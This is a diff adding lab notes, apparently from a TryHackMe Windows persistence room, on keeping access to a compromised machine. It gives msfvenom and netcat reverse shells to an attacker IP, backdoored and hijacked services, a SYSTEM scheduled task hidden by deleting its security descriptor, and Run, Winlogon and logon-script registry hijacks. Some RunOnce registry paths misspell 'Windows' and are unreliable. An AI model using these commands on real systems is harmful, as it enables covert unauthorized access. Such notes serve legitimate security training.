@@ -78,3 +78,79 @@
 			`C:\Windows\System32\NOTEPAD.EXE $args[0]`
 		- Set the Data column should contain `powershell -windowstyle hidden C:\Windows\System32\backdoor2.ps1 %1`.
 		- Create a listener to catch the reverse shell.
+- ## *Abusing Services*
+	- Windows services is a great way to establish persistence since they can run in the background whenever the victim machine is started.
+	- When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
+	- #### *Creating Backdoor Services*
+		- Create and start a new service called `THMservice` using `sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto` and `sc.exe start THMservice`. **NOTE: The space after the equal sign**
+		- This resets the administrator's password to `Passwd123`.
+		- Another way is to create a reverse shell using `msfvenom` and associate it with the created service. Notice that service executables are unique, they implement certain protocol to be handled by the system.
+		- Create an executable that is compatible with Windows services using the `exe-service` format, `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4448 -f exe-service -o rev-svc.exe`.
+		- Transfer the executable to the target system and point the service's `binPath` to it, `sc.exe create THMservice2 binPath= "C:\Windows\rev-svc.exe" start= auto` then `sc.exe start THMservice2`.
+	- #### *Modifying Existing Services*
+		- Since the blue team might monitor new service creation across the network, we might want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service is a good candidate.
+		- List available services using `sc.exe query state=all`.
+		- Find a stopped service and query its configuration using `sc.exe qc <service-name>`.
+		- Three things to care about using a service
+			- The executable `BINARY_PATH_NAME` which should point to our payload.
+			- The service `START_TYPE` should be automatic so that it runs without interaction.
+			- The `SERVICE_START_NAME` which is the account that the service runs with, should preferably be set to `LocalSystem`.
+		- Create a reverse shell using `msfvenom -p windows\x64\shell_reverse_tcp lhost=<attacker-ip> lport=5558 -f exe-service -o rev-svc2.exe`.
+		- Transfer the executable.
+		- Reconfigure the service using `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`.
+		- Query service's configuration again to check using `sc.exe qc THMservice3`.
+		- Stop and start the service to catch the reverse shell.
+- ## *Abusing Scheduled Tasks*
+	- #### *Task Scheduler*
+		- The most common way to schedule tasks is with this built-in scheduler. Allows for granular control, tasks that activate at specific time, repeat periodically or even triggered by an event.
+		- Use `schtasks` to list the scheduled tasks.
+		- Create a task that runs a reverse shell every minute, in a real scenario this shouldn't be done so often.
+		- `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64.exe -e cmd.exe <attacker-ip> 4449" /ru SYSTEM`.
+		- This command creates a `THM-TaskBackdoor` task and executes `nc64` reverse shell back to  the attacker, the `/sc` and `/mo` specifies that the task runs every minute, and `/ru` option indicates that the task runs as SYSTEM.
+		- Check the created task using `schtasks /query /tn thm-taskbackdoor`.
+		- **Making the Task Invisible**
+			- Deleting its Security Descriptor (SD) makes it invisible to any user in the system.
+			- Security Descriptors are saved in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`.
+			- Using `PsExec64.exe -s -i regedit` to open Regedit as SYSTEM, and delete the SD key of the task.
+			- If we try to query the service again, it shouldn't be found.
+- ## *Logon Triggered Persistence*
+	- Some actions performed by a user might be bound to executing specific payloads for persistence. Windows present several ways to link payloads with particular interactions.
+	- #### *Startup Folder*
+		- Each user has a folder under `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in.
+		- If we want to force all users to run a payload when logging in, use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.
+		- Generate a reverse shell with `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4450 -f exe -o revshell1.exe`.
+		- Transfer the payload to the target.
+		- Store the payload in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder.
+		- Logout and then log back in to receive the shell.
+	- #### *Run / RunOnce*
+		- Force a user to execute a program on logon via the registry. Instead of delivering the payload into a specific directory, use the following registry entries to specify applications to run at logon
+			- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+			- `HKCU\Software\Microsoft\Windwos\CurrentVersion\RunOnce`
+			- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+			- `HKLM\Software\Microsoft\Windwos\CurrentVersion\RunOnce`
+		- Registry entries under `HKCU` only apply to current user, and those under `HKLM` applies to everyone.
+		- Create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4451 -f exe -o revshell2.exe`.
+		- Transfer the file to any location, like `C:\Windows\`.
+		- Create a `REG_EXPAND_SZ` registry entry type under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, with any name of our choosing and configure the Data to `C:\Windows\revshell2.exe`.
+		- Sign out of the current session and log back in to trigger the shell.
+	- #### *Winlogon*
+		- Another alternative to automatically start programs on logon.
+		- Winlogon is the component that loads the user profile right after authentication (among other things).
+		- It uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence
+			- `UserInit` points to `userinit.exe` which is in charge of restoring the user profile preferences.
+			- `shell` points to the system's shell, which is actually `explorer.exe`.
+		- **If we would replace any of the executables with a reverse shell, we would break the logon sequence, which isn't desired**
+		- Interestingly, you can append commands separated by commas, and Winlogon will process them all.
+		- Create a shell using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4452 -f exe -o revshell3.exe`.
+		- Transfer the file to any location, like `C:\Windows\`.
+		- We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`.
+		- Sign out and log back in to trigger the shell.
+	- #### *Logon Scripts*
+		- One of the things that `Userinit.exe` does while loading the user profile is to check for an environment variable called `UserInitMprLogonScript`.
+		- We can use this environment variable to assign a logon script to a user that will get run when logging in. The variable isn't set by default, so create it and assign any script to it.
+		- Every user has his own environment variable, so assign one for each if needed.
+		- Create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp lhost=<attacker-ip> lport=4453 -f exe -o revshell4.exe`.
+		- Transfer the file to any location, like `C:\Windows\`.
+		- Create an environment variable from `HKCU\Environment` in the registry, use the `UserInitMprLogonScript` entry to point to our payload.
+		- Entry type `REG_EXPAND_SZ` and Data `C:\Windows\revshell4.exe`.
+		- Sign out and log back in to trigger the shell.
